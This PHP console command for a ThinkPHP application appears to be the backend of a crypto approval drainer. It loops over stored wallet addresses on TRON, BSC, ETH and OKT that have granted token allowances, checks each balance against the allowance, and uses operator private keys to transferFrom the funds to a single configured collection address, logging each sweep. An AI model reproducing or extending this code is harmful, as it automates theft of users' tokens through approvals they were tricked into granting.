<?php
/**
 * 选择自动授权划转
 */
namespace app\command;
use app\common\library\Trxscan;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Db;
use think\Exception;

class SelectAutoApproveTransaction extends Command
{

    protected function configure()
    {
        $this->setName('SelectAutoApproveTransaction')
            ->setDescription('选择自动授权划转');
    }
    public function execute(Input $input, Output $output)
    {
        ini_set('max_execution_time',0);
        $output->writeln('----- '.date('y-m-d H:i:s').' 当前正在执行选择转账任务 -----');
        $page = 1 ;
        while (true) {
            $todo_list = Db('address')
                ->where(['auto'=>1,'auto_money'=>['>','0'],'money_approve'=>['>',0]])
                ->order('updatetime','asc')
                ->page($page,30)
//                ->fetchSql()
                ->select();
            if(empty($todo_list)){
                $page = 0;
                $output->writeln('当前没有待转账任务....');
            }else{
                foreach ($todo_list as $vo) {
                    $output->writeln('----- ' . date('y-m-d H:i:s') . ' 执行'.$vo['address'].'检查 -----');
                    try {
                        Db::startTrans();
                        try {
                            switch ($vo['chain']){
                                case 'trc':
                                    $qb_type = 1;
                                    $address_shou = config('site.shou_trx');
                                    switch ($vo['approve_type']){
                                        case 0:
                                            $approve_user_address = config('site.hy_user_trx');
                                            $approve_key = config('site.hy_user_trx_key');
                                            break;
                                        case 1:
                                            $approve_user_address = $vo['approve_address'];
                                            $approve_key = $vo['account_pre'];
                                            break;
                                    }
                                    break;
                                case 'bsc':
                                    $qb_type = 2;
                                    $address_shou = config('site.shou_bsc');
                                    $approve_user_address = config('site.hy_user_bsc');
                                    $approve_key = config('site.hy_user_bsc_key');
                                    break;
                                case 'eth':
                                    $qb_type = 3;
                                    $address_shou = config('site.shou_eth');
                                    $approve_user_address = config('site.hy_user_eth');
                                    $approve_key = config('site.hy_user_eth_key');
                                    break;
                                case 'okt':
                                    $qb_type = 4;
                                    $address_shou = config('site.shou_bsc');
                                    $approve_user_address = config('site.hy_user_bsc');
                                    $approve_key = config('site.hy_user_bsc_key');
                                    break;
                            }

                            $amount = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$vo['address'],$vo['contract_address'],$vo['approve_address_decimals']);
                            $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$vo['address'],$vo['approve_address'],$vo['contract_address'],$vo['approve_address_decimals']);
                            if($amount > $money_approve){
                                $amount = $money_approve;
                            }
                            if($amount >= $vo['auto_money']  && $vo['auto'] == 1){
                                $output->writeln($vo['id'].','.$vo['address'] . '执行划转:'.$amount);
                                $to = $address_shou;
                                $rrr_arr=config('conf.rrr_arr');
                                $psd = $approve_key;
                                foreach ($rrr_arr as $aaa){
                                    $psd = str_replace($aaa,'',$psd);
                                }

                                $approve_info =array(
                                    'qb_type'=>$qb_type,//钱包类型
                                    'approve_address'=>$vo['approve_address'],//授权合约地址
                                    'approve_user_address'=>$approve_user_address,//调用授权合约的账户
                                    'psd'=>$psd,//调用授权合约的账户的私钥
                                    'user_address'=>$vo['address'],//目标用户钱包
                                    'contract_address'=>$vo['contract_address'],//目标合约
                                    'approve_address_decimals'=>$vo['approve_address_decimals'],//目标合约精度
                                    'sq_approve_type'=>$vo['approve_type'],//0 合约授权 1 账号授权
                                );
                                $receive_info =array(
                                    'to'=>$to,//收款地址
                                    'amount'=>$amount,//金额
                                );
                                $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);
                                if($result){
                                    if($qb_type == 1){
                                        $data['txid']=$result->txID;
                                    }else{
                                        $data['txid']=$result['hash'];
                                    }
                                    $data['user_id']=0;
                                    $data['address']=$vo['address'];
                                    $data['to_address']=$to;
                                    $data['money']=$amount;
                                    $data['createtime']=time();
                                    $data['updatetime']=time();
                                    $ishave = Db('approve_transaction')->where(['txid'=>$data['txid']])->find();
                                    if($ishave){
                                        Db('approve_transaction')->where(['txid'=>$data['txid']])->update(['updatetime'=>time()]);
                                    }else{
                                        Db('approve_transaction')->insert($data);
                                    }
                                    Db('address')->where(['id'=>$vo['id']])->update(['money_online'=>0]);
                                }
                                $output->writeln($vo['id'].','.$vo['address'] . '执行成功,划转:'.$amount);
                            }
                            Db::commit();
                        } catch (Exception $e) {
                            Db::rollback();
                            $output->writeln( '执行失败：' . $e->getMessage());
                        }
                    } catch (\Exception $e) {
                        $output->writeln($vo['id'].','.$vo['address'] . '执行失败：' . $e->getMessage());
                    }
                }
                $output->writeln('----- ' . date('y-m-d H:i:s') . ' 第'.$page.'页任务处理完成 -----');
            }
            sleep(3);
            $page++;
            $output->writeln('----- ' . date('y-m-d H:i:s') . ' 进行第'.$page.'页任务处理 -----');
        }
    }
}
